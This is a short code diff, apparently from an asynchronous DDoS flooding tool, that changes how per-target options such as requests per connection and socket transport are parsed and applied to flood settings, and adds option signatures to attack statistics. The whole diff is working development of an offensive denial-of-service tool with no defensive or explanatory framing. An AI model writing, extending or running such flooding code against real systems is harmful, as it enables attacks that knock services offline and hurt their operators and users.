@@ -72,10 +72,14 @@ async def run_ddos(
 
     def prepare_flooder(target: Target, method: str) -> AsyncFlood:
         thread_statistics = Stats()
-        statistics[(target, method)] = thread_statistics
-        if target.has_option("rpc"):
+        sig = target.options_repr
+        statistics[(target, method, sig)] = thread_statistics
+        if target.has_options:
+            target_rpc = int(target.option("rpc", "0"))
             settings = attack_settings.with_options(
-                requests_per_connection=int(target.option("rpc")))
+                requests_per_connection=target_rpc if target_rpc > 0 else None,
+                low_level_transport=(target.option("transport", "stream") == "sock")
+            )
         else:
             settings = attack_settings
 
@@ -274,8 +278,7 @@ async def start(args, shutdown_event: Event):
 
     attack_settings = AttackSettings(
         requests_per_connection=args.rpc,
-        # XXX: for testing it would be easier to have separate configuration
-        low_level_transport=not args.advanced_allow_uvloop,
+        low_level_transport=False,
         drain_timeout_seconds=0.1,
     )
 
